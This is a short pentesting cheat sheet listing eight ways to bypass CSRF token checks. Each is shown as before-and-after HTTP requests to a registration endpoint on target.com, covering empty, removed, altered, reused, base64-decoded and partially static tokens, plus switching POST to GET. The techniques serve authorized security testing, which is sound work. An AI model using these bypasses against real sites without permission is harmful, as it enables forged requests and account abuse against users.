# Bypass CSRF Token
1. Change single character
```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa
```
Try this to bypass
```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaab
```

2. Sending empty value of token
```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa
```
Try this to bypass
```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=
```

3. Replace the token with same length
```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=aaaaaa
```
Try this to bypass
```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=aaabaa
```
4. Changing POST / GET method
```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa
```
Try this to bypass
```
GET /register?username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa HTTP/1.1
Host: target.com
[...]
```

5. Remove the token from request
```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa
```
Try this to bypass
```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456
```

6. Use another user's valid token
```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=ANOTHER_VALID_TOKEN
```

7. Try to decrypt hash
```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=MTIzNDU2
```
MTIzNDU2 => 123456 with base64

8. Sometimes anti-CSRF token is composed by 2 parts, one of them remains static while the others one dynamic
```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=vi802jg9f8akd9j123
```
When we register again, the request like this
```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=vi802jg9f8akd9j124
```
If you notice "vi802jg9f8akd9j" part of the token remain same, you just need to send with only static part
